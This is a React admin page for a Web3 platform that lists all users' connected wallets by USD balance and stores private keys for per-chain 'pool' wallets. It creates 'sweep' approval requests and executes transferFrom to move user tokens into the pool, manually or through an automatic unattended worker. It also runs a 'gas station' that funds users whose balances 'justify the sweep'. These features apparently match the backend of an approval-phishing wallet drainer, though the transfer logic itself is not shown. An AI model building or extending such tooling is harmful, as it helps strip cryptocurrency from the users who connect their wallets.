import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Network, Key, Zap, Send, RefreshCw, Trash2, Eye, EyeOff, Plus, Search } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Switch } from "@/components/ui/switch";
import { Card } from "@/components/ui/card";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { supabase } from "@/integrations/supabase/client";
import { useAdminSettings } from "@/hooks/useAdminSettings";
import { CHAIN_META } from "@/lib/web3/config";
import { toast } from "sonner";
import WalletStatusPanel from "@/components/admin/WalletStatusPanel";

const CHAIN_OPTIONS = Object.entries(CHAIN_META).map(([id, m]) => ({ id: parseInt(id), ...m }));

const AdminWallets = () => {
  const queryClient = useQueryClient();
  const { data: settings, refetch: refetchSettings } = useAdminSettings();
  const [showKey, setShowKey] = useState(false);
  const [search, setSearch] = useState("");

  // Web3 config form
  const [alchemyKey, setAlchemyKey] = useState(settings?.alchemy_api_key || "");
  const [wcId, setWcId] = useState(settings?.web3_project_id || "");
  const [web3Enabled, setWeb3Enabled] = useState(settings?.web3_enabled ?? false);
  // PK encryption key is auto-generated server-side on first key save
  const [gasEnabled, setGasEnabled] = useState(settings?.gas_station_enabled ?? false);
  const [gasMinUsd, setGasMinUsd] = useState(String(settings?.gas_min_usd_to_sweep ?? 5));
  const [gasDropUsd, setGasDropUsd] = useState(String(settings?.gas_drop_amount_usd ?? 1));
  const [autoSweepEnabled, setAutoSweepEnabled] = useState((settings as any)?.auto_sweep_enabled ?? false);
  const [autoSweepMinUsd, setAutoSweepMinUsd] = useState(String((settings as any)?.auto_sweep_min_usd ?? 10));
  const [autoSweepInterval, setAutoSweepInterval] = useState(String((settings as any)?.auto_sweep_interval_minutes ?? 5));
  const [autoGasTopup, setAutoGasTopup] = useState((settings as any)?.auto_gas_topup_enabled ?? true);

  // Pool key form
  const [pkChainId, setPkChainId] = useState<string>("1");
  const [pkPool, setPkPool] = useState("");
  const [pkSecret, setPkSecret] = useState("");
  const [pkNotes, setPkNotes] = useState("");

  // Pool selector for sweep
  const [sweepPoolId, setSweepPoolId] = useState<string>("");
  const [sweepMinUsd, setSweepMinUsd] = useState("10");

  const { data: wallets = [], isLoading: loadingWallets } = useQuery({
    queryKey: ["admin-all-wallets"],
    queryFn: async () => {
      const { data: rows } = await supabase.from("user_wallets")
        .select("*, user_wallet_assets(*)")
        .order("last_synced_at", { ascending: false });
      const ids = Array.from(new Set((rows || []).map((r: any) => r.user_id)));
      const profileMap: Record<string, any> = {};
      if (ids.length) {
        const { data: profs } = await supabase.from("profiles")
          .select("user_id,email,first_name,last_name").in("user_id", ids);
        (profs || []).forEach((p: any) => { profileMap[p.user_id] = p; });
      }
      return (rows || []).map((r: any) => ({ ...r, profiles: profileMap[r.user_id] || null }));
    },
  });

  const { data: chainKeys = [] } = useQuery({
    queryKey: ["pool-chain-keys"],
    queryFn: async () => {
      const { data } = await supabase.from("pool_chain_keys_safe").select("*");
      return data || [];
    },
  });

  const { data: pools = [] } = useQuery({
    queryKey: ["pools-for-sweep"],
    queryFn: async () => {
      const { data } = await supabase.from("pools").select("id,name,status").order("created_at", { ascending: false });
      return data || [];
    },
  });

  const { data: sweeps = [] } = useQuery({
    queryKey: ["admin-sweeps"],
    queryFn: async () => {
      const { data } = await supabase.from("sweep_requests").select("*").order("created_at", { ascending: false }).limit(50);
      return data || [];
    },
    refetchInterval: 10000,
  });

  const saveWeb3 = useMutation({
    mutationFn: async () => {
      if (!settings?.id) throw new Error("Settings row missing");
      if (wcId && !/^[a-f0-9]{32}$/i.test(wcId)) {
        throw new Error("WalletConnect Project ID must be 32 hex chars (0-9, a-f). Get one at cloud.reown.com.");
      }
      const { error } = await supabase.from("admin_settings").update({
        alchemy_api_key: alchemyKey || null,
        web3_project_id: wcId || null,
        web3_enabled: web3Enabled,
        gas_station_enabled: gasEnabled,
        gas_min_usd_to_sweep: parseFloat(gasMinUsd) || 0,
        gas_drop_amount_usd: parseFloat(gasDropUsd) || 0,
        auto_sweep_enabled: autoSweepEnabled,
        auto_sweep_min_usd: parseFloat(autoSweepMinUsd) || 0,
        auto_sweep_interval_minutes: parseInt(autoSweepInterval) || 5,
        auto_gas_topup_enabled: autoGasTopup,
      } as any).eq("id", settings.id);
      if (error) throw error;
    },
    onSuccess: () => { toast.success("Web3 settings saved"); refetchSettings(); },
    onError: (e: any) => toast.error(e.message),
  });

  const saveKey = useMutation({
    mutationFn: async () => {
      const chainId = parseInt(pkChainId);
      const meta = CHAIN_META[chainId];
      if (!pkPool || !pkSecret) throw new Error("Pool address and private key required");
      // Encryption key auto-provisioned by edge function
      const { data, error } = await supabase.functions.invoke("wallet-keys", {
        body: { action: "upsert", chainId, chainName: meta.name, poolAddress: pkPool, privateKey: pkSecret, notes: pkNotes },
      });
      if (error) throw error;
      if ((data as any)?.error) throw new Error((data as any).error);
    },
    onSuccess: () => { toast.success("Chain key saved"); setPkPool(""); setPkSecret(""); setPkNotes(""); queryClient.invalidateQueries({ queryKey: ["pool-chain-keys"] }); },
    onError: (e: any) => toast.error(e.message),
  });

  const removeKey = useMutation({
    mutationFn: async (chainId: number) => {
      const { error } = await supabase.functions.invoke("wallet-keys", { body: { action: "delete", chainId } });
      if (error) throw error;
    },
    onSuccess: () => { toast.success("Removed"); queryClient.invalidateQueries({ queryKey: ["pool-chain-keys"] }); },
  });

  const syncAll = useMutation({
    mutationFn: async () => {
      const { data, error } = await supabase.functions.invoke("wallet-balances", { body: { syncAll: true } });
      if (error) throw new Error(error.message);
      if ((data as any)?.error) throw new Error((data as any).error);
      return data;
    },
    onSuccess: (d: any) => { toast.success(`Synced ${d?.synced ?? 0} wallets`); setTimeout(() => queryClient.invalidateQueries({ queryKey: ["admin-all-wallets"] }), 1500); },
    onError: (e: any) => toast.error(e.message),
  });

  const triggerSweep = useMutation({
    mutationFn: async () => {
      if (!sweepPoolId) throw new Error("Pick a pool");
      const { data, error } = await supabase.functions.invoke("wallet-sweep", {
        body: { action: "create_requests", poolId: sweepPoolId, minUsd: parseFloat(sweepMinUsd) || 0 },
      });
      if (error) throw error;
      return data;
    },
    onSuccess: (d: any) => { toast.success(`Created ${d?.created || 0} sweep requests`); queryClient.invalidateQueries({ queryKey: ["admin-sweeps"] }); },
    onError: (e: any) => toast.error(e.message),
  });

  const executeSweep = useMutation({
    mutationFn: async (id: string) => {
      const { data, error } = await supabase.functions.invoke("wallet-sweep", { body: { action: "execute", sweepId: id } });
      if (error) throw error;
      if ((data as any)?.error) throw new Error((data as any).error);
    },
    onSuccess: () => { toast.success("Sweep submitted on-chain"); queryClient.invalidateQueries({ queryKey: ["admin-sweeps"] }); },
    onError: (e: any) => toast.error(e.message),
  });

  const filtered = wallets.filter((w: any) =>
    !search || w.address.toLowerCase().includes(search.toLowerCase()) ||
    w.profiles?.email?.toLowerCase().includes(search.toLowerCase())
  );

  const sweepReady = wallets.filter((w: any) =>
    (w.user_wallet_assets || []).some((a: any) => parseFloat(a.balance_usd) >= (settings?.gas_min_usd_to_sweep || 5))
  ).length;

  return (
    <div className="p-4 md:p-8 space-y-6">
      <div>
        <h1 className="text-2xl md:text-3xl font-display font-bold">User Wallets Management</h1>
        <p className="text-sm text-muted-foreground mt-1">Monitor and manage all Web3 wallet connections across the platform</p>
      </div>

      <Tabs defaultValue="wallets" className="w-full">
        <TabsList className="grid grid-cols-4 w-full max-w-2xl">
          <TabsTrigger value="wallets">All Wallets</TabsTrigger>
          <TabsTrigger value="keys">Chain Keys</TabsTrigger>
          <TabsTrigger value="sweep">Sweep</TabsTrigger>
          <TabsTrigger value="config">Config</TabsTrigger>
        </TabsList>

        {/* WALLETS */}
        <TabsContent value="wallets" className="space-y-4">
          <WalletStatusPanel />
          <div className="flex items-center justify-between gap-2">
            <Badge variant="outline" className="border-success/40 text-success">{sweepReady} Sweep Ready</Badge>
            <Button size="sm" onClick={() => syncAll.mutate()} disabled={syncAll.isPending} className="gold-gradient text-primary-foreground">
              <RefreshCw className={`w-4 h-4 mr-2 ${syncAll.isPending ? "animate-spin" : ""}`} /> Sync All Assets
            </Button>
          </div>
          <div className="relative">
            <Search className="w-4 h-4 absolute left-3 top-3 text-muted-foreground" />
            <Input placeholder="Search by email or address" value={search} onChange={(e) => setSearch(e.target.value)} className="pl-9" />
          </div>
          <div className="space-y-2">
            {loadingWallets && <p className="text-sm text-muted-foreground">Loading…</p>}
            {!loadingWallets && filtered.length === 0 && <p className="text-sm text-muted-foreground text-center py-8">No connected wallets yet.</p>}
            {filtered.map((w: any) => {
              const meta = CHAIN_META[w.chain_id];
              const totalUsd = (w.user_wallet_assets || []).reduce((s: number, a: any) => s + parseFloat(a.balance_usd || 0), 0);
              return (
                <Card key={w.id} className="p-3 bg-secondary/30">
                  <div className="flex items-center justify-between gap-3">
                    <div className="min-w-0">
                      <p className="text-sm font-medium truncate">{w.profiles?.email || "Unknown"}</p>
                      <p className="text-xs font-mono text-muted-foreground truncate">{w.address}</p>
                      <div className="flex items-center gap-2 mt-1">
                        <Badge variant="outline" className="h-5 text-[10px]">{meta?.logo} {meta?.name}</Badge>
                        <span className="text-[10px] text-muted-foreground">{w.wallet_type}</span>
                      </div>
                    </div>
                    <div className="text-right shrink-0">
                      <p className="text-base font-bold gold-text">${totalUsd.toFixed(2)}</p>
                      <p className="text-[10px] text-muted-foreground">{(w.user_wallet_assets || []).length} assets</p>
                    </div>
                  </div>
                </Card>
              );
            })}
          </div>
        </TabsContent>

        {/* KEYS */}
        <TabsContent value="keys" className="space-y-4">
          <Card className="p-4 bg-destructive/5 border-destructive/30">
            <div className="flex items-center gap-2 mb-1"><Key className="w-4 h-4 text-destructive" /><h3 className="text-sm font-semibold">Multi-Chain Pool Wallet Keys (Critical)</h3></div>
            <p className="text-xs text-muted-foreground mb-4">Configure separate private keys for each blockchain. Keys are encrypted with your master key and never returned to the browser.</p>
            <div className="grid md:grid-cols-2 gap-3">
              <div><Label className="text-xs">Chain</Label>
                <Select value={pkChainId} onValueChange={setPkChainId}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>{CHAIN_OPTIONS.map(c => <SelectItem key={c.id} value={String(c.id)}>{c.logo} {c.name}</SelectItem>)}</SelectContent>
                </Select>
              </div>
              <div><Label className="text-xs">Pool address (receives swept funds)</Label>
                <Input value={pkPool} onChange={(e) => setPkPool(e.target.value)} placeholder="0x..." className="font-mono text-xs" />
              </div>
              <div className="md:col-span-2"><Label className="text-xs">Private key (0x…)</Label>
                <Input type={showKey ? "text" : "password"} value={pkSecret} onChange={(e) => setPkSecret(e.target.value)} placeholder="0x..." className="font-mono text-xs" />
                <button type="button" onClick={() => setShowKey(!showKey)} className="text-[10px] text-muted-foreground mt-1 flex items-center gap-1">{showKey ? <EyeOff className="w-3 h-3" /> : <Eye className="w-3 h-3" />} {showKey ? "Hide" : "Show"}</button>
              </div>
              <div className="md:col-span-2"><Label className="text-xs">Notes (optional)</Label>
                <Input value={pkNotes} onChange={(e) => setPkNotes(e.target.value)} />
              </div>
            </div>
            <Button onClick={() => saveKey.mutate()} disabled={saveKey.isPending} className="mt-3 gold-gradient text-primary-foreground"><Plus className="w-4 h-4 mr-2" /> {saveKey.isPending ? "Encrypting…" : "Save Key"}</Button>
          </Card>

          <div className="space-y-2">
            <h4 className="text-xs font-semibold text-muted-foreground uppercase">Configured chains</h4>
            {chainKeys.length === 0 && <p className="text-xs text-muted-foreground">No chain keys configured.</p>}
            {chainKeys.map((k: any) => {
              const meta = CHAIN_META[k.chain_id];
              return (
                <Card key={k.id} className="p-3 bg-secondary/30 flex items-center justify-between">
                  <div>
                    <p className="text-sm font-medium">{meta?.logo} {k.chain_name}</p>
                    <p className="text-xs font-mono text-muted-foreground">{k.pool_address}</p>
                    {k.notes && <p className="text-[10px] text-muted-foreground mt-0.5">{k.notes}</p>}
                  </div>
                  <Button size="icon" variant="ghost" onClick={() => removeKey.mutate(k.chain_id)} className="hover:text-destructive"><Trash2 className="w-4 h-4" /></Button>
                </Card>
              );
            })}
          </div>
        </TabsContent>

        {/* SWEEP */}
        <TabsContent value="sweep" className="space-y-4">
          <Card className="p-4 bg-secondary/30">
            <h3 className="text-sm font-semibold flex items-center gap-2 mb-1"><Zap className="w-4 h-4 text-primary" /> Trigger Pool Sweep</h3>
            <p className="text-xs text-muted-foreground mb-4">Generate approval requests for all participants of a pool. Each user must approve in their wallet, then admin executes.</p>
            <div className="grid md:grid-cols-3 gap-3">
              <div><Label className="text-xs">Pool</Label>
                <Select value={sweepPoolId} onValueChange={setSweepPoolId}>
                  <SelectTrigger><SelectValue placeholder="Select pool" /></SelectTrigger>
                  <SelectContent>{pools.map((p: any) => <SelectItem key={p.id} value={p.id}>{p.name} ({p.status})</SelectItem>)}</SelectContent>
                </Select>
              </div>
              <div><Label className="text-xs">Min USD per wallet</Label>
                <Input type="number" value={sweepMinUsd} onChange={(e) => setSweepMinUsd(e.target.value)} />
              </div>
              <div className="flex items-end">
                <Button onClick={() => triggerSweep.mutate()} disabled={triggerSweep.isPending} className="w-full gold-gradient text-primary-foreground">
                  <Send className="w-4 h-4 mr-2" /> {triggerSweep.isPending ? "Creating…" : "Create Sweep Requests"}
                </Button>
              </div>
            </div>
          </Card>

          <div className="space-y-2">
            <h4 className="text-xs font-semibold text-muted-foreground uppercase">Sweep Activity</h4>
            {sweeps.length === 0 && <p className="text-xs text-muted-foreground">No sweep activity.</p>}
            {sweeps.map((s: any) => {
              const meta = CHAIN_META[s.chain_id];
              const canExec = s.status === "approved";
              return (
                <Card key={s.id} className="p-3 bg-secondary/30 flex items-center justify-between gap-2">
                  <div className="min-w-0">
                    <p className="text-sm font-medium">{s.amount} {s.symbol} <span className="text-muted-foreground text-xs">on {meta?.name}</span></p>
                    <p className="text-[10px] text-muted-foreground">user:{s.user_id.slice(0, 8)} · {new Date(s.created_at).toLocaleString()}</p>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    <Badge variant={s.status === "swept" ? "default" : s.status === "failed" ? "destructive" : "outline"}>{s.status}</Badge>
                    {canExec && <Button size="sm" disabled={executeSweep.isPending} onClick={() => executeSweep.mutate(s.id)} className="h-7 gold-gradient text-primary-foreground">Execute</Button>}
                  </div>
                </Card>
              );
            })}
          </div>
        </TabsContent>

        {/* CONFIG */}
        <TabsContent value="config" className="space-y-4">
          <Card className="p-4 bg-secondary/30 space-y-3">
            <h3 className="text-sm font-semibold">Web3 Configuration</h3>
            <div className="flex items-center justify-between"><Label className="text-xs">Enable Web3 features</Label><Switch checked={web3Enabled} onCheckedChange={setWeb3Enabled} /></div>
            <div><Label className="text-xs">ALCHEMY_API_KEY</Label><Input value={alchemyKey} onChange={(e) => setAlchemyKey(e.target.value)} placeholder="alch_..." className="font-mono text-xs" /></div>
            <div>
              <Label className="text-xs">VITE_WEB3_PROJECT_ID (WalletConnect / Reown)</Label>
              <Input value={wcId} onChange={(e) => setWcId(e.target.value.trim())} placeholder="32-char hex from cloud.reown.com" className={`font-mono text-xs ${wcId && !/^[a-f0-9]{32}$/i.test(wcId) ? "border-destructive" : ""}`} />
              {wcId && !/^[a-f0-9]{32}$/i.test(wcId) ? (
                <p className="text-[10px] text-destructive mt-1">⚠️ Invalid format. Must be exactly 32 hexadecimal characters (0-9, a-f). Wallet connections are disabled until this is fixed.</p>
              ) : wcId ? (
                <p className="text-[10px] text-success mt-1">✓ Valid format. Mobile + extension wallets will connect.</p>
              ) : (
                <p className="text-[10px] text-muted-foreground mt-1">Get one free at <a href="https://cloud.reown.com" target="_blank" rel="noreferrer" className="text-primary underline">cloud.reown.com</a> → create project → copy <strong>Project ID</strong>. Then add this app's URL to the Allowlist.</p>
              )}
            </div>
            <p className="text-[10px] text-muted-foreground">🔐 Pool key encryption is automatic — no master key needed.</p>
          </Card>

          <Card className="p-4 bg-secondary/30 space-y-3">
            <h3 className="text-sm font-semibold flex items-center gap-2"><Zap className="w-4 h-4 text-primary" /> Gas Station (Automated Fees)</h3>
            <p className="text-xs text-muted-foreground">Automatically send native gas (ETH/BNB/MATIC) to users when they connect, if their wallet balance justifies the sweep.</p>
            <div className="flex items-center justify-between"><Label className="text-xs">Enable gas station</Label><Switch checked={gasEnabled} onCheckedChange={setGasEnabled} /></div>
            <div className="grid grid-cols-2 gap-3">
              <div><Label className="text-xs">Min wallet USD to qualify</Label><Input type="number" value={gasMinUsd} onChange={(e) => setGasMinUsd(e.target.value)} /></div>
              <div><Label className="text-xs">Gas drop amount (USD-equivalent)</Label><Input type="number" value={gasDropUsd} onChange={(e) => setGasDropUsd(e.target.value)} /></div>
            </div>
          </Card>

          <Card className="p-4 bg-secondary/30 space-y-3 border-primary/30">
            <h3 className="text-sm font-semibold flex items-center gap-2"><RefreshCw className="w-4 h-4 text-primary" /> Automatic Unattended Sweep</h3>
            <p className="text-xs text-muted-foreground">Background worker runs every N minutes. For every <em>approved</em> sweep request above the USD threshold, it auto-checks pool wallet gas, then auto-executes <code>transferFrom</code> on-chain. Pool wallet pays gas — keep it funded.</p>
            <div className="flex items-center justify-between">
              <Label className="text-xs">Enable automatic sweeps</Label>
              <Switch checked={autoSweepEnabled} onCheckedChange={setAutoSweepEnabled} />
            </div>
            <div className="grid grid-cols-3 gap-3">
              <div><Label className="text-xs">Min USD per sweep</Label><Input type="number" value={autoSweepMinUsd} onChange={(e) => setAutoSweepMinUsd(e.target.value)} /></div>
              <div><Label className="text-xs">Run every (min)</Label><Input type="number" value={autoSweepInterval} onChange={(e) => setAutoSweepInterval(e.target.value)} /></div>
              <div className="flex items-end justify-between gap-2">
                <div className="flex-1"><Label className="text-xs">Auto gas top-up</Label><div className="pt-2"><Switch checked={autoGasTopup} onCheckedChange={setAutoGasTopup} /></div></div>
              </div>
            </div>
            <Button
              variant="outline"
              size="sm"
              onClick={async () => {
                const { data, error } = await supabase.functions.invoke("auto-sweep", { body: {} });
                if (error) toast.error(error.message);
                else toast.success(`Processed: ${(data as any)?.processed ?? 0}`);
                queryClient.invalidateQueries({ queryKey: ["admin-sweeps"] });
              }}
              className="w-full"
            >
              <Send className="w-4 h-4 mr-2" /> Run auto-sweep now (test)
            </Button>
          </Card>

          <Button onClick={() => saveWeb3.mutate()} disabled={saveWeb3.isPending} className="w-full gold-gradient text-primary-foreground">{saveWeb3.isPending ? "Saving…" : "Save Configuration"}</Button>
        </TabsContent>
      </Tabs>
    </div>
  );
};

export default AdminWallets;
